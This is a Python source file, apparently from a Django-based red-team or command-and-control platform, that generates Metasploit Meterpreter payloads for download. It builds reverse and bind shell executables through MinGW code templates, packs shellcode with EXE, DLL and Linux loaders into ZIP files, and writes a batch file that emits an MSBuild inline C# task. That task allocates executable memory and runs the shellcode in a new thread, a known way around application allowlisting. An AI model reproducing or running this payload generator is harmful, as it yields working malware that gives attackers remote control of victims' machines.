# -*- coding: utf-8 -*-
# @File  : payload.py
# @Date  : 2021/2/25
# @Desc  :
import base64
import os
import time
import zipfile
from urllib import parse

from django.conf import settings
from django.http import HttpResponse
from jinja2 import Environment, FileSystemLoader

from Lib.api import data_return
from Lib.configs import Payload_MSG, PAYLOAD_LOADER_STORE_PATH
from Lib.lib import TMP_DIR
from Lib.mingw import Mingw
from Lib.msfmodule import MSFModule
from Lib.notice import Notice


class Payload(object):
    def __init__(self):
        # 生成所需参数
        self.path = None  # payload路径 windows/x64/meterpreter/reverse_tcp
        self.lhost = None  # LHOST
        self.lport = None  # LPORT
        self.rhost = None  # RHOST
        self.rport = None  # RPORT
        self.format = None  # exe psh-reflection elf
        # 存储所需参数
        self.link = None  # 文件链接地址

    @staticmethod
    def create(mname=None, opts=None):
        """生成payload文件"""

        # badchars = opts['BadChars'] | | ''
        # fmt = opts['Format'] | | 'raw'
        # force = opts['ForceEncode'] | | false
        # template = opts['Template'] | | nil
        # plat = opts['Platform'] | | nil
        # keep = opts['KeepTemplateWorking'] | | false
        # force = opts['ForceEncode'] | | false
        # sled_size = opts['NopSledSize'].to_i | | 0
        # iter = opts['Iterations'].to_i | | 0

        # 清理历史文件
        Payload._destroy_old_files()

        # 处理RHOST及LHOST参数
        if mname.find("reverse") > 0:
            try:
                opts.pop('RHOST')
            except Exception as _:
                pass
        elif mname.find("bind") > 0:
            try:
                opts.pop('LHOST')
            except Exception as _:
                pass

        # 处理OverrideRequestHost参数
        if opts.get('OverrideRequestHost') is True:
            opts["LHOST"] = opts['OverrideLHOST']
            opts["LPORT"] = opts['OverrideLPORT']
            Notice.send_warn("Payload包含OverrideRequestHost参数")
            Notice.send_warn(f"将LHOST 替换为 OverrideLHOST:{opts['OverrideLHOST']}")
            Notice.send_warn(f"将LPORT 替换为 OverrideLPORT:{opts['OverrideLPORT']}")
        # EXTENSIONS参数
        if "meterpreter_" in mname and opts.get('EXTENSIONS') is True:
            opts['EXTENSIONS'] = 'stdapi'

        if opts.get("Format") == "AUTO":
            if "windows" in mname:
                opts["Format"] = 'exe-src'
            elif "linux" in mname:
                opts["Format"] = 'elf'
            elif "java" in mname:
                opts["Format"] = 'jar'
            elif "python" in mname:
                opts["Format"] = 'py'
            elif "php" in mname:
                opts["Format"] = 'raw'
            else:
                context = data_return(306, Payload_MSG.get(306), {})
                return context

        if opts.get("Format") in ["exe-diy", "dll-diy", "dll-mutex-diy", "elf-diy"]:
            # 生成原始payload
            tmp_type = opts.get("Format")
            opts["Format"] = "hex"
            result = MSFModule.run(module_type="payload", mname=mname, opts=opts)
            if result is None:
                context = data_return(305, Payload_MSG.get(305), {})
                return context

            byteresult = base64.b64decode(result.get('payload'))
            filename = Payload._create_payload_with_loader(mname, byteresult, payload_type=tmp_type)
            # 读取新的zip文件内容
            payloadfile = os.path.join(TMP_DIR, filename)
            if opts.get("HandlerName") is not None:
                filename = f"{opts.get('HandlerName')}_{filename}"
            byteresult = open(payloadfile, 'rb')
        elif opts.get("Format") == "msbuild":
            # 生成原始payload
            opts["Format"] = "csharp"
            result = MSFModule.run(module_type="payload", mname=mname, opts=opts)
            if result is None:
                context = data_return(305, Payload_MSG.get(305), {})
                return context
            byteresult = base64.b64decode(result.get('payload'))
            filename = Payload._create_payload_use_msbuild(mname, byteresult)
            # 读取新的zip文件内容
            payloadfile = os.path.join(TMP_DIR, filename)
            byteresult = open(payloadfile, 'rb')
        elif opts.get("Format") == "exe-src":
            opts["Format"] = "hex"
            result = MSFModule.run(module_type="payload", mname=mname, opts=opts)
            if result is None:
                context = data_return(305, Payload_MSG.get(305), {})
                return context
            byteresult = base64.b64decode(result.get('payload'))
            byteresult = Payload._create_payload_by_mingw(mname=mname, shellcode=byteresult)
            filename = "{}.exe".format(int(time.time()))
        elif opts.get("Format") == "exe-src-service":
            opts["Format"] = "hex"
            result = MSFModule.run(module_type="payload", mname=mname, opts=opts)
            if result is None:
                context = data_return(305, Payload_MSG.get(305), {})
                return context
            byteresult = base64.b64decode(result.get('payload'))  # result为None会抛异常
            byteresult = Payload._create_payload_by_mingw(mname=mname, shellcode=byteresult,
                                                          payload_type="REVERSE_HEX_AS_SERVICE")
            filename = "{}.exe".format(int(time.time()))
        else:
            file_suffix = {
                "c": "c",
                "csharp": "cs",
                "exe": "exe",
                "exe-service": "exe",
                "powershell": "ps1",
                "psh-reflection": "ps1",
                "psh-cmd": "ps1",
                "hex": "hex",
                "hta-psh": "hta",
                "raw": "raw",
                "vba": "vba",
                "vbscript": "vbs",
                "elf": None,
                "elf-so": "so",
                "jar": "jar",
                "java": "java",
                "war": "war",
                "python": "py",
                "py": "py",
                "python-reflection": "py",
            }
            result = MSFModule.run(module_type="payload", mname=mname, opts=opts)
            if result is None:
                context = data_return(305, Payload_MSG.get(305), {})
                return context
            byteresult = base64.b64decode(result.get('payload'))
            if file_suffix.get(opts.get("Format")) is None:
                filename = "{}".format(int(time.time()))
            else:
                filename = "{}.{}".format(int(time.time()), file_suffix.get(opts.get("Format")))

        response = HttpResponse(byteresult)
        response['Content-Type'] = 'application/octet-stream'
        response['Code'] = 200
        response['Message'] = parse.quote(Payload_MSG.get(201))
        # 中文特殊处理
        urlpart = parse.quote(os.path.splitext(filename)[0], 'utf-8')
        leftpart = os.path.splitext(filename)[-1]
        response['Content-Disposition'] = f"{urlpart}{leftpart}"
        return response

    @staticmethod
    def _create_payload_by_mingw(mname=None, shellcode=None, payload_type="REVERSE_HEX"):
        if payload_type == "REVERSE_HEX":
            env = Environment(loader=FileSystemLoader(Mingw.CODE_TEMPLATE_DIR))
            tpl = env.get_template('REVERSE_HEX.c')
            reverse_hex_str = bytes.decode(shellcode)[::-1]
            src = tpl.render(SHELLCODE_STR=reverse_hex_str)
        elif payload_type == "REVERSE_HEX_AS_SERVICE":
            env = Environment(loader=FileSystemLoader(Mingw.CODE_TEMPLATE_DIR))
            tpl = env.get_template('REVERSE_HEX_AS_SERVICE.c')
            reverse_hex_str = bytes.decode(shellcode)[::-1]
            src = tpl.render(SHELLCODE_STR=reverse_hex_str)
        else:
            raise Exception('unspport type')

        if mname.startswith('windows/x64'):
            arch = 'x64'
        elif mname.startswith('windows/meterpreter'):
            arch = 'x86'
        else:
            raise Exception('unspport mname')
        mingwx64 = Mingw()
        byteresult = mingwx64.compile_c(src, arch)
        mingwx64.cleanup_files()
        return byteresult

    @staticmethod
    def _create_payload_with_loader(mname=None, result=None, payload_type="exe-diy"):
        filename = "{}.zip".format(int(time.time()))

        payloadfile = os.path.join(TMP_DIR, filename)
        extraloader_filepath = None
        extra_arcname = None
        if payload_type == "exe-diy":
            arcname = "loader.exe"
            shellcode_filename = "loader.ini"
            if mname.startswith('windows/x64'):
                loaderfile = 'loader_x64.exe'
            elif mname.startswith('windows/meterpreter'):
                loaderfile = 'loader_x86.exe'
            else:
                raise Exception('unspport mname')
        elif payload_type == "dll-diy":
            arcname = "loaderdll.dll"
            shellcode_filename = "loaderdll.ini"
            if mname.startswith('windows/x64'):
                loaderfile = 'DirectDLL_x64.dll'
            elif mname.startswith('windows/meterpreter'):
                loaderfile = 'DirectDLL_x86.dll'
            else:
                raise Exception('unspport mname')
        elif payload_type == "dll-mutex-diy":
            arcname = "loaderdllmutex.dll"
            shellcode_filename = "loaderdllmutex.ini"
            if mname.startswith('windows/x64'):
                loaderfile = 'MDSDLL_x64.dll'
                extraloader = 'loader_x64.exe'
                extraloader_filepath = os.path.join(settings.BASE_DIR, PAYLOAD_LOADER_STORE_PATH, extraloader)
                extra_arcname = "loaderdllmutex.exe"
            elif mname.startswith('windows/meterpreter'):
                loaderfile = 'MDSDLL_x86.dll'
                extraloader = 'loader_x86.exe'
                extraloader_filepath = os.path.join(settings.BASE_DIR, PAYLOAD_LOADER_STORE_PATH, extraloader)
                extra_arcname = "loaderdllmutex.exe"
            else:
                raise Exception('unspport mname')
        elif payload_type == "elf-diy":
            arcname = "loader"
            shellcode_filename = "shellcode"
            if mname.startswith('linux/x64'):
                loaderfile = 'unix_sc'
            elif mname.startswith('linux/x86'):
                loaderfile = 'unix_sc_x86'
            else:
                raise Exception('unspport mname')
        else:
            arcname = "loader.exe"
            shellcode_filename = "loader.ini"
            if mname.startswith('windows/x64'):
                loaderfile = 'loader_x64.exe'
            elif mname.startswith('windows/meterpreter'):
                loaderfile = 'loader_x86.exe'
            else:
                raise Exception('unspport mname')

        loader_filepath = os.path.join(settings.BASE_DIR, PAYLOAD_LOADER_STORE_PATH, loaderfile)
        new_zip = zipfile.ZipFile(payloadfile, 'w')
        new_zip.writestr(shellcode_filename, data=result, compress_type=zipfile.ZIP_DEFLATED)
        new_zip.write(loader_filepath, arcname=arcname, compress_type=zipfile.ZIP_DEFLATED)
        if payload_type == "dll-mutex-diy":
            new_zip.write(extraloader_filepath, arcname=extra_arcname, compress_type=zipfile.ZIP_DEFLATED)
        new_zip.close()
        return filename

    @staticmethod
    def _create_payload_use_msbuild(mname=None, shellcode=None):
        filename = "{}.zip".format(int(time.time()))
        if isinstance(shellcode, bytes):
            shellcode = shellcode.decode(encoding="utf-8").replace("\n", '')

        if mname.startswith('windows/x64'):
            msbuilddllpath = """C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll"""
        elif mname.startswith('windows/meterpreter'):
            msbuilddllpath = """C:\\Windows\\Microsoft.Net\\Framework\\v4.0.30319\\Microsoft.Build.Tasks.v4.0.dll"""
        else:
            raise Exception('unspport mname')
        filedata = f"""
echo ^<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003"^>>>a.xml
echo  ^<Target Name="Hello"^>>>a.xml
echo    ^<ClassExample /^>>>a.xml
echo  ^</Target^>>>a.xml
echo  ^<UsingTask>>a.xml
echo    TaskName="ClassExample">>a.xml
echo    TaskFactory="CodeTaskFactory">>a.xml
echo    AssemblyFile="{msbuilddllpath}" ^>>>a.xml
echo    ^<Task^>>>a.xml
echo      ^<Code Type="Class" Language="cs"^>>>a.xml
echo      ^<![CDATA[>>a.xml
echo        using System;>>a.xml
echo        using System.Runtime.InteropServices;>>a.xml
echo        using Microsoft.Build.Framework;>>a.xml
echo        using Microsoft.Build.Utilities;>>a.xml
echo        public class ClassExample :  Task, ITask>>a.xml
echo        {{         >>a.xml
echo          private static UInt32 MEM_COMMIT = 0x1000;          >>a.xml
echo          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          >>a.xml
echo          [DllImport("kernel32")]>>a.xml
echo            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,>>a.xml
echo            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          >>a.xml
echo          [DllImport("kernel32")]>>a.xml
echo            private static extern IntPtr CreateThread(            >>a.xml
echo            UInt32 lpThreadAttributes,>>a.xml
echo            UInt32 dwStackSize,>>a.xml
echo            UInt32 lpStartAddress,>>a.xml
echo            IntPtr param,>>a.xml
echo            UInt32 dwCreationFlags,>>a.xml
echo            ref UInt32 lpThreadId           >>a.xml
echo            );>>a.xml
echo          [DllImport("kernel32")]>>a.xml
echo            private static extern UInt32 WaitForSingleObject(           >>a.xml
echo            IntPtr hHandle,>>a.xml
echo            UInt32 dwMilliseconds>>a.xml
echo            );          >>a.xml
echo          public override bool Execute()>>a.xml
echo          {{>>a.xml
echo            {shellcode}>>a.xml
echo              UInt32 funcAddr = VirtualAlloc(0, (UInt32)buf.Length,>>a.xml
echo                MEM_COMMIT, PAGE_EXECUTE_READWRITE);>>a.xml
echo              Marshal.Copy(buf, 0, (IntPtr)(funcAddr), buf.Length);>>a.xml
echo              IntPtr hThread = IntPtr.Zero;>>a.xml
echo              UInt32 threadId = 0;>>a.xml
echo              IntPtr pinfo = IntPtr.Zero;>>a.xml
echo              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);>>a.xml
echo              WaitForSingleObject(hThread, 0xFFFFFFFF);>>a.xml
echo              return true;>>a.xml
echo          }} >>a.xml
echo        }}     >>a.xml
echo      ]]^>>>a.xml
echo      ^</Code^>>>a.xml
echo    ^</Task^>>>a.xml
echo  ^</UsingTask^>>>a.xml
echo ^</Project^>>>a.xml"""

        payloadfile = os.path.join(TMP_DIR, filename)

        new_zip = zipfile.ZipFile(payloadfile, 'w')
        new_zip.writestr("cmd.bat", data=filedata, compress_type=zipfile.ZIP_DEFLATED)
        readmefilepath = os.path.join(settings.BASE_DIR, "STATICFILES", "STATIC", "msbuild.md")
        new_zip.write(readmefilepath, arcname="readme.md", compress_type=zipfile.ZIP_DEFLATED)
        new_zip.close()
        return filename

    @staticmethod
    def _destroy_old_files():
        for file in os.listdir(TMP_DIR):
            file_path = os.path.join(TMP_DIR, file)
            if os.path.isdir(file_path):
                continue
            else:
                timestamp = time.time()
                file_timestamp = os.path.getctime(file_path)
                if timestamp - file_timestamp > 3600 * 24:
                    os.remove(file_path)
